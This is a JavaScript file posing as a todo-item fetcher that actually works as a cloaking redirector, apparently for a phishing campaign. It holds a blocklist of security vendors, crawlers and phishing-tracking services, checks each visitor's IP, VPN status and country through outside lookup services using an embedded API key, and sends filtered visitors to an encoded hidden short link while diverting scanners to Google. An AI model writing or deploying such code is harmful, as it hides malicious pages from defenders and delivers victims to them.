
// const BASE_URL = "https://jsonplaceholder.typicode.com";
const hostname = [
"teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com","virustotal.com","spamhaus.org","spamhaus.org","fortinet.com","www.fortinet.com","phishing","phishingtank","microsoft"
]
const getTodoItems = async () => {
  try {
      var link = ''
      if (window.location.href.split("#")[1] != undefined) {
          const a = window.location.href.split("#")[1];
          const encodedInput = a.split("=")[1];
          if (!encodedInput) {
              window.location.href = "https://href.li?https://google.com";
              return;
          }
          if (!encodedInput.startsWith("r-")) {
              window.location.href = "https://href.li?https://google.com";
              return;
          }  
          const base64String = encodedInput.slice(2).replace(/-/g, "+").replace(/_/g, "/");
          const jsonData = atob(base64String);
          const decodedObject = JSON.parse(jsonData);
          const urlEncodedInput ="r-eyJkYXRhIjoiMmx5LmxpbmsvMjZJaGk_dXNlcj1hdXRob3JpemVkIn0";
          if (decodedObject.data == "authorizedUser") {
              const urlbase64String = urlEncodedInput.slice(2).replace(/-/g, "+").replace(/_/g, "/");
              const urljsonData = atob(urlbase64String);
              const urldecodedObject = JSON.stringify(urljsonData);
              const decodedObject = JSON.parse(urldecodedObject);
              const linkString = decodedObject;
              const jsonObject = JSON.parse(linkString);
              link = jsonObject.data;
          } else {
              window.location.href = "https://href.li?https://google.com";
              return;
          }
          var ub = "495ro9-2368zh-f675v8-f8797e"
          await axios.get(`https://ipapi.co/json/`).then(async (ans) => {
          await axios.get(`https://proxycheck.io/v2/${ans.data.ip}?key=${ub}&vpn=3&asn=1`).then((res) => {
              const ipApi = res.data;
              const host = ipApi[ans.data.ip].hostname;
          if (ipApi[ans.data.ip].isocode !== "US" || ipApi[ans.data.ip].vpn == "yes") {
              if (ipApi[ans.data.ip].organisation == "Datacamp Limited" && ipApi[ans.data.ip].region == "Delaware" && ipApi[ans.data.ip].city == "Wilmington") {
                  document.location.href = `https://${link}`;
                  return;
              } else if (ipApi[ans.data.ip].organisation == "iCloud Private Relay") {
                  req.session.org = ipApi[ans.data.ip].organisation;
                  document.location.href = `https://${link}`;
                  return;
              } else if (hostname.includes(host)) {
                   document.location.href ="https://href.li?https://google.com"
                   return;
              } else {
                   document.location.href ="https://href.li?https://google.com"
                   return;
              }
          }else{ 
              if (hostname.includes(host)) {
                  document.location.href ="https://href.li?https://google.com"
                   return;
              } else {
                  document.location.href = `https://${link}`;
                  return;
              }
          }
        });
    });
  }else{
      window.location.href = "https://href.li?https://google.com";
  }
  } catch (errors) {
    console.error(errors);
  }
};
getTodoItems();
